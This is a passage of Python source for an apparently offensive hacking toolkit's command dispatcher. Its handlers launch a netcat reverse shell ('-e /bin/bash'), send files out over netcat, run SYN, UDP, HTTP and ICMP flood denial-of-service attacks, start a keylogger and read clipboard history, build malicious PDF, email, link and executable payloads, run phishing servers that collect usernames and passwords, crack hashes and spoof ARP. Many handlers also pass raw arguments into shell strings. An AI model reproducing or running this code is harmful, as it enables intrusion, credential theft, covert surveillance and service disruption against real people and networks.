            'arp_status': self._arp_status, 'arp_history': self._arp_history,
            'arp_scan': self._arp_scan,
            # MAC
            'mac_info': self._mac_info, 'mac_scan': self._mac_scan,
            'mac_vendor': self._mac_vendor,
            # NAT
            'nat_info': self._nat_info, 'nat_public': self._nat_public,
            'nat_private': self._nat_private, 'nat_router': self._nat_router,
            # Docker
            'docker_scan': self._docker_scan, 'docker_info': self._docker_info,
            'docker_ps': self._docker_ps, 'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            # Email
            'email_compose': self._email_compose, 'email_send': self._email_send,
            'email_list': self._email_list, 'email_delete': self._email_delete,
            # PDF
            'report_generate': self._report_generate, 'report_list': self._report_list,
            # Monitor
            'monitor_start': self._monitor_start, 'monitor_stop': self._monitor_stop,
            'monitor_add': self._monitor_add, 'monitor_status': self._monitor_status,
            'monitor_list': self._monitor_list,
            # Scans
            'scan': self._scan, 'quick_scan': self._quick_scan, 'full_scan': self._full_scan,
            # IP management
            'add_ip': self._add_ip, 'remove_ip': self._remove_ip,
            'block_ip': self._block_ip, 'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips, 'ip_info': self._ip_info, 'analyze_ip': self._analyze_ip,
            # System
            'status': self._status, 'history': self._history, 'system': self._system,
            'threats': self._threats, 'report': self._report, 'clear': self._clear,
            'stats': self._status, 'version': self._version, 'help': self._help,
        }
        
        # Add phishing templates
        for template_name in self.social.templates.keys():
            commands[f'phish_{template_name}'] = lambda _, t=template_name: self._phish(t)
        
        return commands
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        cmd_name = parts[0].lower()
        args = parts[1:]
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        self.db.log_command(command, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        return result
    
    # Ping
    def _ping(self, args):
        if not args: return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        r = self.tools.ping(target, count)
        return {'success': r.success, 'output': r.output}
    
    def _ping6(self, args):
        if not args: return {'success': False, 'output': 'Usage: ping6 <target>'}
        return self._generic(f'ping6 -c 4 {args[0]}')
    
    def _ping_sweep(self, args):
        if not args: return {'success': False, 'output': 'Usage: ping_sweep <network>'}
        return self._generic(f'nmap -sn {args[0]}')
    
    def _fping(self, args):
        if not args: return {'success': False, 'output': 'Usage: fping <targets...>'}
        return self._generic(f'fping {" ".join(args)}')
    
    def _ping_count(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        return self._generic(f'ping -c {args[1]} {args[0]}')
    
    def _ping_flood(self, args):
        if not args: return {'success': False, 'output': 'Usage: ping_flood <target>'}
        return self._generic(f'ping -f {args[0]}')
    
    def _ping_timeout(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: ping_timeout <target> <timeout>'}
        return self._generic(f'ping -W {args[1]} {args[0]}')
    
    def _ping_size(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        return self._generic(f'ping -s {args[1]} {args[0]}')
    
    def _ping_interval(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        return self._generic(f'ping -i {args[1]} {args[0]}')
    
    # Nmap
    def _nmap(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap <target>'}
        r = self.tools.nmap(args[0])
        return {'success': r.success, 'output': r.output}
    
    def _nmap_quick(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        r = self.tools.nmap(args[0], 'quick')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_full(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_full <target>'}
        r = self.tools.nmap(args[0], 'full')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_os(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_os <target>'}
        r = self.tools.nmap(args[0], 'os')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_service(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_service <target>'}
        r = self.tools.nmap(args[0], 'service')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_udp(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        r = self.tools.nmap(args[0], 'udp')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_vuln(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        r = self.tools.nmap(args[0], 'vulnerability')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_stealth(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        r = self.tools.nmap(args[0], 'stealth')
        return {'success': r.success, 'output': r.output}
    
    def _nmap_ping(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        return self._generic(f'nmap -sn {args[0]}')
    
    def _nmap_traceroute(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        return self._generic(f'nmap --traceroute {args[0]}')
    
    def _nmap_script(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        return self._generic(f'nmap --script {args[1]} {args[0]}')
    
    def _nmap_aggressive(self, args):
        if not args: return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        return self._generic(f'nmap -A -T4 {args[0]}')
    
    # Traceroute
    def _traceroute(self, args):
        if not args: return {'success': False, 'output': 'Usage: traceroute <target>'}
        r = self.tools.traceroute(args[0])
        return {'success': r.success, 'output': r.output}
    
    def _tracepath(self, args):
        if not args: return {'success': False, 'output': 'Usage: tracepath <target>'}
        return self._generic(f'tracepath {args[0]}')
    
    def _mtr(self, args):
        if not args: return {'success': False, 'output': 'Usage: mtr <target>'}
        return self._generic(f'mtr --report --report-cycles 1 {args[0]}')
    
    def _tcptraceroute(self, args):
        if not args: return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        return self._generic(f'tcptraceroute {args[0]}')
    
    def _traceroute_udp(self, args):
        if not args: return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        return self._generic(f'traceroute -U {args[0]}')
    
    def _traceroute_icmp(self, args):
        if not args: return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        return self._generic(f'traceroute -I {args[0]}')
    
    # Wget
    def _wget(self, args):
        if not args: return {'success': False, 'output': 'Usage: wget <url> [output]'}
        r = self.tools.wget(args[0], args[1] if len(args) > 1 else None)
        return {'success': r.success, 'output': r.output}
    
    def _wget_file(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: wget_file <url> <filename>'}
        r = self.tools.wget(args[0], args[1])
        return {'success': r.success, 'output': r.output}
    
    def _wget_recursive(self, args):
        if not args: return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        return self._generic(f'wget -r -l 2 -np -nd {args[0]}')
    
    def _wget_mirror(self, args):
        if not args: return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        return self._generic(f'wget --mirror -p --convert-links {args[0]}')
    
    def _wget_continue(self, args):
        if not args: return {'success': False, 'output': 'Usage: wget_continue <url>'}
        return self._generic(f'wget -c {args[0]}')
    
    def _wget_limit(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: wget_limit <url> <rate>'}
        return self._generic(f'wget --limit-rate={args[1]} {args[0]}')
    
    def _wget_user_agent(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: wget_user_agent <url> <ua>'}
        return self._generic(f'wget --user-agent="{args[1]}" {args[0]}')
    
    def _wget_header(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        return self._generic(f'wget --header="{args[1]}" {args[0]}')
    
    def _wget_post(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: wget_post <url> <data>'}
        return self._generic(f'wget --post-data="{args[1]}" {args[0]}')
    
    def _wget_auth(self, args):
        if len(args) < 3: return {'success': False, 'output': 'Usage: wget_auth <url> <user> <pass>'}
        return self._generic(f'wget --user={args[1]} --password={args[2]} {args[0]}')
    
    # Curl
    def _curl(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl <url>'}
        r = self.tools.curl(args[0])
        return {'success': r.success, 'output': r.output}
    
    def _curl_get(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl_get <url>'}
        r = self.tools.curl(args[0], 'GET')
        return {'success': r.success, 'output': r.output}
    
    def _curl_post(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        r = self.tools.curl(args[0], 'POST', args[1])
        return {'success': r.success, 'output': r.output}
    
    def _curl_head(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl_head <url>'}
        return self._generic(f'curl -s -I {args[0]}')
    
    def _curl_options(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl_options <url>'}
        return self._generic(f'curl -s -X OPTIONS {args[0]}')
    
    def _curl_put(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        return self._generic(f'curl -s -X PUT -d "{args[1]}" {args[0]}')
    
    def _curl_delete(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl_delete <url>'}
        return self._generic(f'curl -s -X DELETE {args[0]}')
    
    def _curl_patch(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        return self._generic(f'curl -s -X PATCH -d "{args[1]}" {args[0]}')
    
    def _curl_auth(self, args):
        if len(args) < 3: return {'success': False, 'output': 'Usage: curl_auth <url> <user> <pass>'}
        return self._generic(f'curl -s -u {args[1]}:{args[2]} {args[0]}')
    
    def _curl_cookie(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        return self._generic(f'curl -s -b "{args[1]}" {args[0]}')
    
    def _curl_follow(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl_follow <url>'}
        return self._generic(f'curl -s -L {args[0]}')
    
    def _curl_verbose(self, args):
        if not args: return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        return self._generic(f'curl -v {args[0]}')
    
    # Netcat
    def _netcat(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: netcat <host> <port>'}
        r = self.tools.netcat(args[0], int(args[1]), args[2] if len(args) > 2 else None)
        return {'success': r.success, 'output': r.output}
    
    def _nc_listen(self, args):
        if not args: return {'success': False, 'output': 'Usage: nc_listen <port>'}
        return self._generic(f'nc -lvp {args[0]}')
    
    def _nc_scan(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: nc_scan <host> <ports>'}
        return self._generic(f'nc -zv {args[0]} {args[1]}')
    
    def _nc_chat(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: nc_chat <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]}')
    
    def _nc_transfer(self, args):
        if len(args) < 3: return {'success': False, 'output': 'Usage: nc_transfer <host> <port> <file>'}
        return self._generic(f'nc {args[0]} {args[1]} < {args[2]}')
    
    def _nc_shell(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: nc_shell <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]} -e /bin/bash')
    
    # SSH
    def _ssh_add(self, args):
        if not self.ssh: return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: ssh_add <name> <host> <user> [pass]'}
        conn = self.ssh.add_connection(args[0], args[1], args[2], args[3] if len(args) > 3 else None)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args):
        if not self.ssh: return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections: return {'success': True, 'output': 'No SSH connections'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']}\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args):
        if not self.ssh: return {'success': False, 'output': 'SSH manager not initialized'}
        if not args: return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        if self.ssh.connect(args[0]):
            return {'success': True, 'output': f"Connected to {args[0]}"}
        return {'success': False, 'output': f"Failed to connect to {args[0]}"}
    
    def _ssh_exec(self, args):
        if not self.ssh: return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        r = self.ssh.execute_command(args[0], ' '.join(args[1:]))
        return {'success': r.success, 'output': r.output}
    
    def _ssh_disconnect(self, args):
        if not self.ssh: return {'success': False, 'output': 'SSH manager not initialized'}
        if not args: return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
        self.ssh.disconnect(args[0])
        return {'success': True, 'output': f"Disconnected from {args[0]}"}
    
    # Traffic
    def _traffic(self, args):
        if not self.traffic: return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        try:
            self.traffic.generate(args[0].lower(), args[1], duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {args[0]} traffic to {args[1]} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args):
        if not self.traffic: return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        return {'success': True, 'output': "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])}
    
    def _traffic_stop(self, args):
        if not self.traffic: return {'success': False, 'output': 'Traffic generator not initialized'}
        if self.traffic.stop(args[0] if args else None):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args):
        if not self.traffic: return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active: return {'success': True, 'output': 'No active generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _traffic_icmp(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: traffic_icmp <ip> <duration>'}
        return self._traffic(['icmp', args[0], args[1]])
    
    def _traffic_tcp(self, args):
        if len(args) < 3: return {'success': False, 'output': 'Usage: traffic_tcp <ip> <port> <duration>'}
        return self._traffic(['tcp_syn', args[0], args[2], args[1]])
    
    def _traffic_udp(self, args):
        if len(args) < 3: return {'success': False, 'output': 'Usage: traffic_udp <ip> <port> <duration>'}
        return self._traffic(['udp', args[0], args[2], args[1]])
    
    def _traffic_http(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: traffic_http <ip> <duration>'}
        return self._traffic(['http_get', args[0], args[1]])
    
    def _traffic_dns(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: traffic_dns <ip> <duration>'}
        return self._traffic(['dns', args[0], args[1]])
    
    def _traffic_arp(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: traffic_arp <ip> <duration>'}
        return self._traffic(['arp', args[0], args[1]])
    
    def _traffic_mixed(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: traffic_mixed <ip> <duration>'}
        return self._traffic(['mixed', args[0], args[1]])
    
    # Nikto
    def _nikto(self, args):
        if not self.nikto: return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args: return {'success': False, 'output': 'Usage: nikto <target>'}
        result = self.nikto.scan(args[0])
        if result['success']:
            output = f"🕷️ Nikto scan of {args[0]} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown')}"}
    
    def _nikto_full(self, args):
        if not self.nikto: return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args: return {'success': False, 'output': 'Usage: nikto_full <target>'}
        result = self.nikto.scan(args[0], {'tuning': '123456789', 'ssl': True})
        return {'success': result['success'], 'output': f"Full scan completed: {len(result.get('vulnerabilities', []))} findings"}
    
    def _nikto_ssl(self, args):
        if not self.nikto: return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args: return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        result = self.nikto.scan(args[0], {'ssl': True})
        return {'success': result['success'], 'output': f"SSL scan completed: {len(result.get('vulnerabilities', []))} findings"}
    
    def _nikto_port(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: nikto_port <target> <port>'}
        result = self.nikto.scan(args[0], {'port': int(args[1])})
        return {'success': result['success'], 'output': f"Scan on port {args[1]}: {len(result.get('vulnerabilities', []))} findings"}
    
    def _nikto_tuning(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: nikto_tuning <target> <tuning>'}
        result = self.nikto.scan(args[0], {'tuning': args[1]})
        return {'success': result['success'], 'output': f"Tuned scan completed: {len(result.get('vulnerabilities', []))} findings"}
    
    # DOS
    def _dos_syn(self, args):
        if not self.dos: return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        return self.dos.syn_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_udp(self, args):
        if not self.dos: return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        return self.dos.udp_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_http(self, args):
        if not self.dos: return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        return self.dos.http_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_icmp(self, args):
        if not self.dos: return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        return self.dos.icmp_flood(args[0], int(args[1]), int(args[2]) if len(args) > 2 else 50)
    
    def _dos_stop(self, args):
        if not self.dos: return {'success': False, 'output': 'DOS engine not initialized'}
        if self.dos.stop(args[0] if args else None):
            return {'success': True, 'output': 'DOS attack stopped'}
        return {'success': False, 'output': 'Failed to stop DOS'}
    
    def _dos_status(self, args):
        if not self.dos: return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active: return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # Agent
    def _agent_register(self, args):
        if not self.agent: return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: agent_register <name> <ip>'}
        result = self.agent.register_agent(args[0], args[1])
        return {'success': result.get('success', False), 'output': result.get('message', '')}
    
    def _agent_command(self, args):
        if not self.agent: return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: agent_command <id> <command>'}
        success = self.agent.send_command(args[0], ' '.join(args[1:]))
        return {'success': success, 'output': f"Command sent to agent {args[0]}" if success else "Failed"}
    
    def _agent_list(self, args):
        if not self.agent: return {'success': False, 'output': 'Agent engine not initialized'}
        agents = self.agent.get_agents()
        if not agents: return {'success': True, 'output': 'No agents registered'}
        output = "Registered Agents:\n"
        for a in agents:
            output += f"  • {a['id']} - {a['name']} ({a['ip_address']})\n"
        return {'success': True, 'output': output}
    
    def _agent_status(self, args):
        if not self.agent: return {'success': False, 'output': 'Agent engine not initialized'}
        if not args: return {'success': False, 'output': 'Usage: agent_status <id>'}
        agent = self.agent.get_agent(args[0])
        if not agent: return {'success': False, 'output': f"Agent {args[0]} not found"}
        return {'success': True, 'output': json.dumps(agent, indent=2)}
    
    # Network monitor
    def _netmon_start(self, args):
        if not self.network_monitor: return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.start()
        return {'success': True, 'output': 'Network monitor started'}
    
    def _netmon_stop(self, args):
        if not self.network_monitor: return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.stop()
        return {'success': True, 'output': 'Network monitor stopped'}
    
    def _netmon_status(self, args):
        if not self.network_monitor: return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = f"Network Monitor Status:\n  Running: {self.network_monitor.running}\n"
        output += f"  Packets: {self.network_monitor.packet_count}\n"
        return {'success': True, 'output': output}
    
    def _netmon_packets(self, args):
        if not self.network_monitor: return {'success': False, 'output': 'Network monitor not initialized'}
        limit = int(args[0]) if args else 20
        packets = self.network_monitor.get_packets(limit)
        if not packets: return {'success': True, 'output': 'No packets captured'}
        output = f"Recent Packets ({len(packets)}):\n"
        for p in packets:
            output += f"  {p.get('source_ip', '')} -> {p.get('dest_ip', '')}\n"
        return {'success': True, 'output': output}
    
    def _netmon_stats(self, args):
        if not self.network_monitor: return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = "📊 Network Statistics:\n"
        output += f"  Total Packets: {stats.get('total_packets', 0)}\n"
        return {'success': True, 'output': output}
    
    # Keylogger
    def _keylogger_start(self, args):
        if not self.keylogger: return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args):
        if not self.keylogger: return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args):
        if not self.keylogger: return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args):
        if not self.keylogger: return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs: return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args):
        return {'success': True, 'output': 'No screenshots captured'}
    
    def _keylogger_clipboard(self, args):
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard: return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # Deployment
    def _deploy_pdf(self, args):
        if not self.deployment: return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: deploy_pdf <name> <target> <url>'}
        d = self.deployment.create_pdf_payload(args[0], args[1], args[2])
        return {'success': True, 'output': f"PDF deployment created: {d.id}\nFile: {d.payload}"}
    
    def _deploy_email(self, args):
        if not self.deployment: return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 5: return {'success': False, 'output': 'Usage: deploy_email <name> <target> <subject> <body> <url>'}
        d = self.deployment.create_email_payload(args[0], args[1], args[2], args[3], args[4])
        return {'success': True, 'output': f"Email deployment created: {d.id}"}
    
    def _deploy_link(self, args):
        if not self.deployment: return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: deploy_link <name> <target> <url>'}
        d = self.deployment.create_link_payload(args[0], args[1], args[2])
        return {'success': True, 'output': f"Link deployment created: {d.id}\nURL: {d.payload}"}
    
    def _deploy_executable(self, args):
        if not self.deployment: return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: deploy_executable <name> <target> <server>'}
        d = self.deployment.create_executable_payload(args[0], args[1], args[2])
        return {'success': True, 'output': f"Executable deployment created: {d.id}"}
    
    def _deploy_list(self, args):
        if not self.deployment: return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments: return {'success': True, 'output': 'No deployments'}
        output = "Deployments:\n"
        for d in deployments:
            output += f"  • {d['id']} - {d['name']} ({d['type']})\n"
        return {'success': True, 'output': output}
    
    def _deploy_track(self, args):
        if not self.deployment: return {'success': False, 'output': 'Deployment engine not initialized'}
        if not args: return {'success': False, 'output': 'Usage: deploy_track <deployment_id>'}
        self.deployment.track_opened(args[0])
        return {'success': True, 'output': f"Tracked open for {args[0]}"}
    
    # Domain hosting
    def _ip_to_domain(self, args):
        if not self.domain_hosting: return {'success': False, 'output': 'Domain hosting not initialized'}
        if not args: return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        domain = self.domain_hosting.translate_ip_to_domain(args[0])
        if domain: return {'success': True, 'output': f"Domain for {args[0]}: {domain}"}
        return {'success': False, 'output': f"No domain found for {args[0]}"}
    
    def _domain_to_ip(self, args):
        if not self.domain_hosting: return {'success': False, 'output': 'Domain hosting not initialized'}
        if not args: return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        ip = self.domain_hosting.translate_domain_to_ip(args[0])
        if ip: return {'success': True, 'output': f"IP for {args[0]}: {ip}"}
        return {'success': False, 'output': f"No IP found for {args[0]}"}
    
    def _host_domain(self, args):
        if not self.domain_hosting: return {'success': False, 'output': 'Domain hosting not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        port = int(args[2]) if len(args) > 2 else 8080
        d = self.domain_hosting.host_domain(args[0], args[1], port)
        if d: return {'success': True, 'output': f"Domain {args[1]} hosted on {args[0]}:{port}"}
        return {'success': False, 'output': 'Failed to host domain'}
    
    def _list_domains(self, args):
        if not self.domain_hosting: return {'success': False, 'output': 'Domain hosting not initialized'}
        domains = self.domain_hosting.list_hosted_domains()
        if not domains: return {'success': True, 'output': 'No hosted domains'}
        output = "Hosted Domains:\n"
        for d in domains:
            output += f"  • {d['domain']} -> {d['ip']}\n"
        return {'success': True, 'output': output}
    
    # Social engineering
    def _phish(self, platform):
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"Start with: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate link'}
    
    def _phish_start(self, args):
        if not args: return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(args[0], port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server"}
    
    def _phish_stop(self, args):
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args):
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds: return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # Cracking
    def _crack(self, args):
        if not self.cracking: return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: crack <hash_type> <hash> [wordlist]'}
        wordlist = args[2] if len(args) > 2 else None
        job_id = self.cracking.crack_hash(args[0], args[1], wordlist)
        return {'success': True, 'output': f"🔓 Cracking job started: {job_id}"}
    
    def _crack_status(self, args):
        if not self.cracking: return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args: return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job = self.cracking.get_job_status(args[0])
        if not job: return {'success': False, 'output': f"Job {args[0]} not found"}
        output = f"🔓 Job Status: {args[0]}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'): output += f"  Result: {job.get('result')}\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args):
        if not self.cracking: return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs: return {'success': True, 'output': 'No cracking jobs'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            output += f"  • {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    def _crack_md5(self, args):
        if not args: return {'success': False, 'output': 'Usage: crack_md5 <hash>'}
        return self._crack(['md5'] + args)
    
    def _crack_sha1(self, args):
        if not args: return {'success': False, 'output': 'Usage: crack_sha1 <hash>'}
        return self._crack(['sha1'] + args)
    
    def _crack_sha256(self, args):
        if not args: return {'success': False, 'output': 'Usage: crack_sha256 <hash>'}
        return self._crack(['sha256'] + args)
    
    def _crack_ntlm(self, args):
        if not args: return {'success': False, 'output': 'Usage: crack_ntlm <hash>'}
        return self._crack(['ntlm'] + args)
    
    # ARP
    def _arp_spoof(self, args):
        if not self.arp_spoofing: return {'success': False, 'output': 'ARP spoofing not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <gateway_ip> [interface]'}
        interface = args[2] if len(args) > 2 else None
